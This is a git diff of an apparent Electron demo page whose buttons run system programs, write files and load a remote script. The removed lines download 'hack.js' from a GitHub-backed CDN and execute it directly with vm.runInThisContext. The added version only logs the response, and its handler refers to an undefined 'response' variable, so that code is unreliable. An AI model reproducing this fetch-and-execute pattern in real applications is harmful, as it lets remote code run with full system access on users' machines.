@@ -16,7 +16,7 @@
   <button onclick="runBash()">运行系统程序</button>
   <button onclick="writeJSFile()">写入指定文件</button>
   <button onclick="runJSFile()">运行指定文件</button>
-  <button onclick="remoteJSFile()">运行远程http文件</button>
+  <button onclick="remoteJSFile()">运行远程 net 文件</button>
   <button onclick="openDir()">打开指定目录</button>
   <button onclick="runExe()">运行指定程序</button>
   <div id="info"></div>
@@ -25,8 +25,7 @@
     const bash = require('child_process')
     const fs = require('fs')
     const path = require('path')
-    const http = require('http')
-    const vm = require('vm')
+    const { net } = require('electron')
 
     const homedir = os.homedir()
     const desktop = path.join(homedir, 'Desktop')
@@ -67,11 +66,11 @@
     }
 
     function remoteJSFile () {
-      const src = 'http://cdn.jsdelivr.net/gh/Hunlongyu/hack@main/docs/hack.js'
-      http.get(src, res => {
-        res.on('data', data => {
-          console.log(data, 'remote js file')
-          vm.runInThisContext( data, 'remote/hack.js' )
+      const src = 'https://cdn.jsdelivr.net/gh/Hunlongyu/hack@main/docs/hack.js'
+      const request = net.request(src)
+      request.on('response', res => {
+        response.on('data', data => {
+          console.log(data, '----- data -----')
         })
       })
     }
